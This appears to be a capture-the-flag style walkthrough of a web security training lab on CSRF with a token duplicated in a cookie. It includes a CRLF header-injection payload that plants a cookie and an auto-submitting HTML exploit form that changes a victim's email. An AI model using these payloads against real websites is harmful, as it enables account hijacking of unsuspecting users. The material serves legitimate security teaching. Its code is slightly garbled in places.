
---
## CSRF token is simply duplicated in a cookie

In a further variation on the preceding vulnerability, some applications do not maintain any server-side record of tokens that have been issued, but instead duplicate each token within a cookie and a request parameter. When the subsequent request is validated, the application simply verifies that the token submitted in the request parameter matches the value submitted in the cookie. This is sometimes called the "double submit" defense against CSRF, and is advocated because it is simple to implement and avoids the need for any server-side state:

```
POST /email/change HTTP/1.1 Host: vulnerable-website.com Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa

csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener@normal-user.com
```

In this situation, the attacker can again perform a CSRF attack if the website contains any cookie setting functionality. Here, the attacker doesn't need to obtain a valid token of their own. They simply invent a token (perhaps in the required format, if that is being checked), leverage the cookie-setting behavior to place their cookie into the victim's browser, and feed their token to the victim in their CSRF attack.

## Lab: CSRF where token is duplicated in cookie

This lab's email change functionality is vulnerable to CSRF. It attempts to use the insecure "double submit" CSRF prevention technique.

To solve the lab, we will use our exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

We can log in to your own account using the following credentials:Â `wiener:peter`


This is a similar lab to the previous one. We will begin by capturing an Update email request and send it to the Repeater. We will notice that the both of the CSRF token and the Cookie CSRF are the same. We will try to set both of these values to something else. If we send the request with identical CSRF values, we will get a 200 OK response. Now, all we have to do is that to find a way to inject a Cookie CSRF value in our HTML exploit code. We will try the same HTTP injection vulnerability that we used in the previous lab. 

Indeed, when we use the search bar in the Home page, a new 
Cookie called LastSearchTerm. We need to capture a search request and send it to the Repeater.

After we capture the search request, in Repeater, we will change the search value that is next to the GET header to the following:`GET / ?search=(what ever we searched for)%0d%0aSet-Cookie:%20csrf=(any text we want)%3b%20SameSite=None`

Now, using the the update email request, we will create the HTML exploit code, which will look like this: 
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a42003d048d286a805badfe0094002e.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test2@test.com" />
      <input type="hidden" name="csrf" value="ok" />
      <input type="submit" value="Submit request" />
    </form>

```

We will remove the `<script>` tags and replace them with this code : `<img src="https://0a42003d048d286a805badfe0094002e.web-security-academy.net/?search=hat%0d%0aSet-Cookie:%20csrf=ok%3b%20SameSite=None" onerror="document.forms[0].submit()" >`

This will try to load an image but it will fail. However, it will force the victim's browser to set the csrf cookie value to the same csrf token value that we specified. When the browser fails to load the image, it will submit the form changing the email address of the victim. 

We will past the HTML code and put it in our exploit server. We will deliver the exploit to the user solving the lab.

